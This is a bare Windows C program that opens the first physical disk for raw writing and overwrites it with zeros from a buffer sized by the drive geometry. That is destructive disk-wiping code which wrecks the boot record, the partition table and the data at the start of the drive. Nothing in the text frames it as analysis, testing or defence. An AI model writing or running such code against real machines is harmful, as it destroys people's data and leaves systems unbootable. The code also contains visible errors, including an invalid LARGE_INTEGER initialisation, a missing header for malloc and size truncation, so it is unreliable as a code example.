#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE hDisk = CreateFile(
        "\\\\.\\PhysicalDrive0",  // first disk
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hDisk == INVALID_HANDLE_VALUE) {
        printf("Failed to open disk\n");
        return 1;
    }

    DWORD dwBytesReturned;
    DISK_GEOMETRY diskGeometry;
    DeviceIoControl(hDisk, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &diskGeometry, sizeof(diskGeometry), &dwBytesReturned, NULL);

    LARGE_INTEGER diskSize = diskGeometry.Cylinders.LowPart;
    diskSize.QuadPart *= diskGeometry.TracksPerCylinder;
    diskSize.QuadPart *= diskGeometry.SectorsPerTrack;
    diskSize.QuadPart *= diskGeometry.BytesPerSector;

    char *buffer = (char *)malloc(diskSize.LowPart);
    if (buffer == NULL) {
        printf("Failed to allocate memory\n");
        CloseHandle(hDisk);
        return 1;
    }

    memset(buffer, 0, diskSize.LowPart);

    DWORD written;
    WriteFile(hDisk, buffer, diskSize.LowPart, &written, NULL);

    free(buffer);

    CloseHandle(hDisk);
    printf("Wrote %lu bytes\n", written);
    return 0;
}
